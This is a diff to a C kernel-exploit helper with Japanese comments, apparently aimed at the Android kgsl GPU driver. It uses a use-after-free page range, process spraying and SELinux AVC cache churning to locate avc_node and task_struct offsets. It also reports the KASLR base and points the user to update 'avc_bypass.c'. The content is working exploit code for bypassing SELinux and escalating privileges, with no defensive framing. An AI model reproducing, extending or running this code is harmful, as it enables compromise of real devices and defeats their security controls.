-    // 6. スプレー kill + churn (AVC ノードを UAF ページに載せる)
+    printf("[*] Churning to populate AVC cache...\n");
+    for (int i = 0; i < 5; i++) {
+        int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
+        if (fd >= 0) close(fd);
+        int dfd = open("/sys/fs/selinux/enforce", O_RDONLY);
+        if (dfd >= 0) close(dfd);
+        usleep(10000);
+    }
+
+    uint64_t all_vas[4096];
+    int n_all = 0;
+    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
+        if (n_all < 4096) all_vas[n_all++] = va;
+    }
+    printf("[AVC] Scanning entire UAF range (%d pages) for avc_node\n", n_all);
+    int found = analyze_avc_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+                                  all_vas, n_all);
+
+    if (found == 0) {
+        printf("[AVC] No AVC nodes found. More churn or scan range adjustment may be needed.\n");
+        printf("[AVC] Please manually verify avc_node structure size and offsets.\n");
+    }
+
     kill_spray_children();
-    usleep(100000);
-    printf("[*] Churning for AVC nodes...\n");
-    churn_build();
-    for (int c = 0; c < 8; c++) churn_round();
-    printf("[AVC] entries=%d\n", avc_entries());
-
-    // 7. AVC オフセット検出
-    if (detect_avc_offsets(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &detected)) {
-        detected.avc_found = true;
-    } else {
-        detected.avc_found = false;
-    }
-
-    // 8. 結果表示
-    printf("\n========== DETECTED OFFSETS ==========\n");
-    printf("KASLR base            : 0x%lx\n", (unsigned long)kbase);
-    printf("task_struct.comm      : ");
-    if (detected.task_comm_found) {
-        printf("0x%x\n", detected.task_comm_offset);
-    } else {
-        printf("NOT FOUND (try increasing SPRAY_PIDS)\n");
-    }
-    printf("avc_node.ssid         : ");
-    if (detected.avc_found) {
-        printf("0x%x\n", detected.avc_ssid_offset);
-    } else {
-        printf("NOT FOUND (try increasing churn or adjusting candidates)\n");
-    }
-    printf("avc_node.tsid         : 0x%x\n", detected.avc_tsid_offset);
-    printf("avc_node.tclass       : 0x%x\n", detected.avc_tclass_offset);
-    printf("avc_node.allowed      : 0x%x\n", detected.avc_allowed_offset);
-    printf("========================================\n");
-
-    if (detected.task_comm_found && detected.avc_found) {
-        printf("[+] All necessary offsets detected. You can now update avc_bypass.c.\n");
-    } else {
-        printf("[!] Some offsets missing. Check your environment and try again.\n");
-    }
-
-cleanup:
-    kill_spray_children();
-    while (wait(NULL) > 0);
     close(kgsl_fd);
+    printf("[*] Analysis complete. Adjust constants in avc_bypass.c based on output.\n");
     return 0;
 }
